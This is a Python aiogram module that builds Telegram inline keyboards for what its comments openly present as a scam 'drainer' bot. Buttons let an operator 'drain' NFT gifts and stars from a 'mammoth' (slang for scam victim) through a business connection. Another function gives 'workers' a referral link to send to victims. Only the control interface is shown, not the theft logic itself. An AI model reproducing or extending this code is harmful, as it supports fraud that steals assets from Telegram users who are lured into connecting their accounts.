from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.filters.callback_data import CallbackData # Импорт CallbackData для создания колбэков

# --- Определение классов CallbackData для кнопок ---

class ManualControl(CallbackData, prefix="manual"):
    """
    Класс CallbackData для кнопок ручного управления операциями (дрейн, конвертация).
    Используется для передачи информации о действии и ID мамонта.
    """
    action: str  # Действие (например, "drain_gifts", "convert_gifts", "drain_stars")
    mammoth_id: int # ID пользователя-мамонта, для которого выполняется действие

class RefreshConnection(CallbackData, prefix="refresh"):
    """
    Новый класс CallbackData для кнопки "Обновить данные".
    Используется для передачи ID мамонта и ID бизнес-подключения для обновления информации.
    """
    mammoth_id: int # ID пользователя-мамонта
    bc_id: str      # ID бизнес-подключения (business_connection_id)

# --- Функции для генерации клавиатур ---

def get_manual_control_keyboard(mammoth_id: int, bc_id: str) -> InlineKeyboardMarkup:
    """
    Генерирует инлайн-клавиатуру для ручного управления бизнес-подключением.
    Добавлена кнопка "Обновить данные".

    :param mammoth_id: ID пользователя-мамонта.
    :param bc_id: ID бизнес-подключения.
    :return: Объект InlineKeyboardMarkup.
    """
    buttons = [
        [
            InlineKeyboardButton(
                text="✨ Конвертировать",
                # Создаем колбэк для действия "convert_gifts" с ID мамонта
                callback_data=ManualControl(action="convert_gifts", mammoth_id=mammoth_id).pack()
            )
        ],
        [
            InlineKeyboardButton(
                text="🎁 Вывести NFT-подарки",
                # Создаем колбэк для действия "drain_gifts" с ID мамонта
                callback_data=ManualControl(action="drain_gifts", mammoth_id=mammoth_id).pack()
            ),
            InlineKeyboardButton(
                text="⭐️ Вывести звёзды",
                # Создаем колбэк для действия "drain_stars" с ID мамонта
                callback_data=ManualControl(action="drain_stars", mammoth_id=mammoth_id).pack()
            )
        ],
        [
            # Новая кнопка для обновления данных о подключении
            InlineKeyboardButton(
                text="🔄 Обновить данные",
                # Создаем колбэк для действия "refresh" с ID мамонта и ID бизнес-подключения
                callback_data=RefreshConnection(mammoth_id=mammoth_id, bc_id=bc_id).pack()
            )
        ]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def get_start_bot_keyboard(worker_id: int) -> InlineKeyboardMarkup:
    """
    Генерирует инлайн-клавиатуру с кнопкой для начала подключения к боту.
    Используется для воркеров, чтобы они могли отправить ссылку мамонту.

    :param worker_id: ID воркера, который будет включен в start-параметр ссылки.
    :return: Объект InlineKeyboardMarkup.
    """
    button = InlineKeyboardButton(
        text="▶️ Начать подключение",
        # URL-ссылка для запуска бота с параметром worker_id
        url=f"https://t.me/NFTscaners_bot?start={worker_id}"
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[button]])
    return keyboard